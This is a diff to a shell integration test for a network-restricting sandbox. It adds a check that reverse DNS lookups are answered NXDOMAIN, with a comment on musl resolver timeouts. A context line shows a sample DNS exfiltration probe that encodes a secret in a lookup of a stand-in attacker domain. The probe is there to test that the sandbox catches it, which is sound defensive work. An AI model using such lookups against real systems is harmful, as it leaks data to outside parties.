@@ -182,6 +182,21 @@ echo "=== [DNS-only exfiltration] ==="
 (nslookup SECRET-IN-A-NAME.attacker.example >/dev/null 2>&1 || true)
 echo "  PASS  queried (checked in the report, see integration-test-inspect-restrict.sh)"
 
+# Nothing in the cage has a name, so the only question is how the lookup ends.
+# A query the resolver leaves unhandled is answered SERVFAIL, which musl reads
+# as a server that may yet answer: it retries and then waits out its whole
+# five-second timeout, once for every tool that reverse-resolves its own
+# address or the gateway's. NXDOMAIN is final and costs nothing.
+echo "=== [Reverse lookup] ==="
+RDNS_OUT=$(nslookup 172.20.0.1 2>&1 || true)
+case "$RDNS_OUT" in
+  *NXDOMAIN*) echo "  PASS  the reverse lookup was refused outright" ;;
+  *)
+    echo "  FAIL  the reverse lookup was not answered NXDOMAIN -- got: $RDNS_OUT"
+    FAILURES=$((FAILURES + 1))
+    ;;
+esac
+
 echo "=== [Address in a URL rule] ==="
 OUT=$($S http://10.200.0.100/pub-by-addr/x)
 check_ok "GET http://10.200.0.100/pub-by-addr/x" "$OUT" "ROOT GET"
